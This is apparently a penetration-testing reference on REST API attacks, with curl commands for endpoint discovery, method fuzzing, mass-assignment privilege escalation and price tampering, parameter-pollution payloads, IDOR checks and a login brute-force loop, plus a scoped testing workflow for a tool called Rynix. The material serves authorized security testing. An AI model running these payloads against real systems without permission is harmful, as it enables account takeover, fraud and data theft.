---
id: PS-API
category: API testing
wstg_refs: [WSTG-APIT-02]
lab_count: 5
---

# REST API Testing: Attack Technique Reference

## 1. Detection

### 1A. Identifying API Endpoints

**Common API base paths to probe:**
```
/api
/api/v1
/api/v2
/v1
/v2
/rest
/api/rest
/services
/graphql
```

**API documentation paths:**
```
/api/docs
/api-docs
/swagger
/swagger.json
/swagger.yaml
/swagger/index.html
/swagger-ui
/swagger-ui.html
/openapi.json
/openapi.yaml
/api/swagger
/api/openapi
/docs
/redoc
/_docs
/api/schema
/api-explorer
```

**curl probing:**
```bash
# Check common doc paths
for path in /api/docs /swagger.json /openapi.json /api-docs /swagger/index.html /swagger-ui.html; do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' https://target.com${path})
  echo "$CODE $path"
done

# Check for API base paths
for path in /api /api/v1 /api/v2 /rest /v1; do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' https://target.com${path})
  echo "$CODE $path"
done
```

### 1B. API Discovery from JavaScript

Parse client-side JavaScript to find API endpoints, base URLs, and parameter names:
```bash
# Extract API calls from JS files
curl -sk https://target.com/main.js | grep -oE '(fetch|axios|XMLHttpRequest|\.ajax)\([^)]*\)'
curl -sk https://target.com/main.js | grep -oE '/api/[a-zA-Z0-9/_-]+'
curl -sk https://target.com/main.js | grep -oE 'https?://[^"'"'"' ]*api[^"'"'"' ]*'
```

### 1C. Base Path Enumeration

When you discover an endpoint like `/api/v1/users/123`, systematically check parent paths:
```bash
# Walk up the path
curl -sk https://target.com/api/v1/users/123    # Known endpoint
curl -sk https://target.com/api/v1/users         # List users?
curl -sk https://target.com/api/v1               # API index?
curl -sk https://target.com/api                  # Docs/index?
```

## 2. Techniques

### 2A. API Documentation Discovery and Exploitation

Exposed API documentation reveals every endpoint, parameter, authentication requirement, and sometimes example values. This is the equivalent of full introspection.

> Lab refs: PS-API-01

**What to extract from discovered documentation:**
- All endpoints with HTTP methods (GET, POST, PUT, PATCH, DELETE)
- Parameter names, types, and whether they are required/optional
- Authentication and authorization requirements per endpoint
- Response schemas showing available data fields
- Admin or internal endpoints that may be accessible

**Exploiting exposed docs:**
```bash
# Download OpenAPI spec
curl -sk https://target.com/openapi.json -o openapi.json

# Parse for all endpoints
cat openapi.json | jq '.paths | keys[]'

# Find endpoints requiring no auth
cat openapi.json | jq '.paths | to_entries[] | select(.value[].security == null or .value[].security == []) | .key'

# Find DELETE endpoints (dangerous operations)
cat openapi.json | jq '.paths | to_entries[] | select(.value.delete != null) | .key'
```

**Try accessing admin endpoints discovered in docs:**
```bash
# If docs reveal DELETE /api/users/{id}
curl -sk -X DELETE -H "Cookie: session=abc" https://target.com/api/users/carlos
```

### 2B. Endpoint Discovery via Method and Path Fuzzing

When documentation is not available, discover hidden endpoints and supported methods through fuzzing.

> Lab refs: PS-API-03

**HTTP method fuzzing (test all methods on known endpoints):**
```bash
# Test all methods on a known endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  CODE=$(curl -sk -X $method -o /dev/null -w '%{http_code}' \
    -H "Cookie: session=abc" \
    https://target.com/api/v1/users/123)
  echo "$method → $CODE"
done
```

**Path pattern fuzzing:**
```bash
# If /api/v1/users exists, try related resources
for resource in admin config settings debug internal health status info metrics; do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' https://target.com/api/v1/${resource})
  echo "$CODE /api/v1/${resource}"
done
```

**Version fuzzing:**
```bash
# If /api/v2/users is locked down, try older versions
for ver in v1 v0 v3 beta internal; do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' https://target.com/api/${ver}/users)
  echo "$CODE /api/${ver}/users"
done
```

**Content-Type switching:**
```bash
# API may be secure with JSON but vulnerable with XML
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"search":"test"}' https://target.com/api/search

# Try same endpoint with XML
curl -sk -X POST -H "Content-Type: application/xml" \
  -d '<search>test</search>' https://target.com/api/search

# Try form encoding
curl -sk -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'search=test' https://target.com/api/search
```

### 2C. Mass Assignment (Auto-Binding Vulnerabilities)

When frameworks automatically bind request parameters to internal object properties, attackers can modify fields they should not have access to (like `role`, `isAdmin`, `price`, `balance`).

> Lab refs: PS-API-04

**Discovery — find hidden writable fields:**
1. Send a GET request to read the object and note all returned fields
2. Identify fields that should be server-controlled (role, isAdmin, verified, balance, price, discount)
3. Attempt to include those fields in a PUT/PATCH/POST request

```bash
# Step 1: Read current object
curl -sk -H "Cookie: session=abc" https://target.com/api/users/me
# Response: {"id":123, "username":"wiener", "email":"w@test.com", "role":"user", "isAdmin":false}

# Step 2: Try to set admin via PATCH
curl -sk -X PATCH -H "Cookie: session=abc" -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  https://target.com/api/users/me

# Step 3: Try boolean admin flag
curl -sk -X PATCH -H "Cookie: session=abc" -H "Content-Type: application/json" \
  -d '{"isAdmin":true}' \
  https://target.com/api/users/me

# Step 4: Try during registration
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"test","email":"a@evil.com","role":"admin"}' \
  https://target.com/api/register
```

**Product price manipulation:**
```bash
# Read product details
curl -sk https://target.com/api/products/1
# Response: {"id":1, "name":"Widget", "price":1000, "discount":0}

# Try to set price or discount
curl -sk -X POST -H "Cookie: session=abc" -H "Content-Type: application/json" \
  -d '{"productId":1,"quantity":1,"price":0}' \
  https://target.com/api/checkout

curl -sk -X POST -H "Cookie: session=abc" -H "Content-Type: application/json" \
  -d '{"productId":1,"quantity":1,"discount":100}' \
  https://target.com/api/checkout
```

**Parameter mining with header-fuzz probe wordlist:**
Common mass assignment field names to try:
```
admin, isAdmin, is_admin, role, user_role, userRole, group,
privilege, level, access_level, accessLevel, permissions,
verified, is_verified, isVerified, active, banned,
price, total, amount, balance, credit, discount,
password, password_hash, api_key, apiKey, token, secret
```

### 2D. Server-Side Parameter Pollution (SSPP)

When the application constructs internal API requests using user input without proper sanitization, attackers inject additional parameters or modify the request structure.

> Lab refs: PS-API-02, PS-API-05

**2D-i. Query String Injection**

Inject `&` to add parameters to internal API calls:
```bash
# Original request
POST /userSearch
username=peter

# Internal API call: GET /api/users?username=peter&publicProfile=true

# Inject to add/override parameters
POST /userSearch
username=peter%26publicProfile=false

# Inject to override with a different value
POST /userSearch
username=peter%26role=admin

# curl
curl -sk -X POST -d 'username=peter%26publicProfile=false' https://target.com/userSearch
```

**2D-ii. Query String Truncation**

Use `#` (URL-encoded as `%23`) to truncate the server-side query string, removing parameters appended by the application:
```bash
# If internal API appends &publicProfile=true, truncate it
POST /userSearch
username=peter%23

# Internal API call becomes: GET /api/users?username=peter# (publicProfile removed)

# curl
curl -sk -X POST -d 'username=peter%23' https://target.com/userSearch
```

**2D-iii. REST Path Injection**

Inject path traversal sequences into parameters that are interpolated into REST URL paths:
```bash
# If internal API constructs: GET /api/users/{username}/profile
# Inject path traversal to access admin endpoint

POST /userSearch
username=peter/../../admin

# URL-encoded
username=peter%2f..%2f..%2fadmin

# curl
curl -sk -X POST -d 'username=peter%2f..%2fadmin' https://target.com/userSearch
```

**2D-iv. JSON Structure Injection**

When user input is embedded in a JSON body sent to an internal API, inject to override or add JSON properties:
```bash
# If internal API constructs: {"username":"INPUT","access":"user"}
# Inject to override access level

POST /userSearch
Content-Type: application/json

{"username":"peter\",\"access\":\"admin"}

# Or via structured injection
{"username":"peter","access":"admin","x":""}

# curl
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"peter\",\"access\":\"admin"}' \
  https://target.com/userSearch
```

**Detection methodology:**
1. Submit unexpected characters in parameters: `#`, `&`, `=`, URL-encoded variants
2. Compare responses between normal input and injected input
3. If behavior changes (different error, different data returned, truncated response), SSPP is likely
4. Map the internal API structure by testing what parameters are accepted

## 3. API-Specific Attack Patterns

### 3A. BOLA (Broken Object-Level Authorization) / IDOR

Test every endpoint with an ID parameter using IDs belonging to other users:
```bash
# Your data
curl -sk -H "Cookie: session=abc" https://target.com/api/users/123
curl -sk -H "Cookie: session=abc" https://target.com/api/orders/456

# Other users' data
curl -sk -H "Cookie: session=abc" https://target.com/api/users/124
curl -sk -H "Cookie: session=abc" https://target.com/api/orders/457

# Try sequential and common IDs
for id in 1 2 3 100 101 999 0 -1; do
  curl -sk -H "Cookie: session=abc" https://target.com/api/users/$id
done
```

### 3B. BFLA (Broken Function-Level Authorization)

Test admin endpoints with a regular user's session:
```bash
# Admin endpoint accessed with regular user cookie
curl -sk -X DELETE -H "Cookie: session=regular_user" https://target.com/api/admin/users/carlos
curl -sk -X PUT -H "Cookie: session=regular_user" -H "Content-Type: application/json" \
  -d '{"role":"admin"}' https://target.com/api/admin/users/123
```

### 3C. Excessive Data Exposure

Check if API responses include more data than the UI displays:
```bash
# Compare API response with what the frontend shows
curl -sk -H "Cookie: session=abc" https://target.com/api/users/me
# Look for: password hashes, internal IDs, email addresses, API keys, tokens,
#           admin flags, creation timestamps, internal notes
```

### 3D. Rate Limiting and Resource Exhaustion

```bash
# Test rate limiting
for i in $(seq 1 100); do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X POST \
    -d '{"username":"admin","password":"pass'$i'"}' \
    https://target.com/api/login)
  echo "$i: $CODE"
done

# If no 429 responses, rate limiting is absent
```

## 4. Testing Methodology

### Phase 1: Discover
- Crawl application and extract API endpoints from HTML, JavaScript, and network traffic
- Check for exposed API documentation (Swagger, OpenAPI, GraphQL introspection)
- Fuzz for hidden endpoints and older API versions
- Map all parameters, methods, and content types per endpoint

### Phase 2: Document
- Build an endpoint inventory with: method, path, parameters, auth requirements, response schema
- Identify which endpoints are read-only vs. state-changing
- Note which endpoints accept user IDs or object references
- Identify hidden/internal fields from response bodies

### Phase 3: Test Authentication and Authorization
- Test every endpoint with: no auth, wrong user, lower-privilege user, expired token
- Test IDOR on every endpoint with an ID parameter (try at least 3 alternate IDs)
- Test mass assignment on every write endpoint (include hidden fields from response)
- Test method switching (GET vs POST vs PUT vs DELETE)

### Phase 4: Test Input Handling
- Test all string parameters for injection (SQL, NoSQL, command, XSS)
- Test content-type switching (JSON, XML, form-encoded) for parser differentials
- Test parameter pollution (duplicate parameters, array parameters)
- Test SSPP on parameters used in internal API calls

### Phase 5: Test Business Logic
- Test rate limiting on authentication and sensitive operations
- Test for excessive data exposure in responses
- Test file upload endpoints for type and size restrictions
- Test pagination for data leakage (large page sizes, negative offsets)
## Rynix workflow

1. `get_technique_guide` for `api-testing` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `list_api_routes`, `export_openapi_stub`, `http_probe`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `list_api_routes`
- `export_openapi_stub`
- `http_probe`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

